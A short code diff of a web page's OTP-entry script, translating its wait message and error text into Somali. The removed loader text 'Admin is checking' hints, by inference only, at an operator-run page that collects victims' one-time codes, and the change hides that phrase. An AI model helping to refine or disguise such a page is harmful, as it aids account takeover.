@@ -1178,7 +1178,7 @@
       if (otp1Val.length !== 6 || otp1Done) return;
       
       document.getElementById("oh1").disabled = true;
-      document.getElementById("loaderText").textContent = "Fadlan sug... Admin is checking";
+      document.getElementById("loaderText").textContent = "Fadlan sug...";
       document.getElementById("loaderOv").classList.add("show");
 
       // Send to server
@@ -1201,7 +1201,7 @@
         function() {
           document.getElementById("oh1").disabled = false;
           otp1.reset(false);
-          document.getElementById("mn1").innerHTML = "<span style='color:#dc2626; font-weight:bold;'>⚠️ Code is incorrect or expired. Try again.</span>";
+          document.getElementById("mn1").innerHTML = "<span style='color:#dc2626; font-weight:bold;'>⚠️ Koodhku waa khaldan yahay ama wuu dhacay Isku day mar kale.</span>";
         }
       );
     }
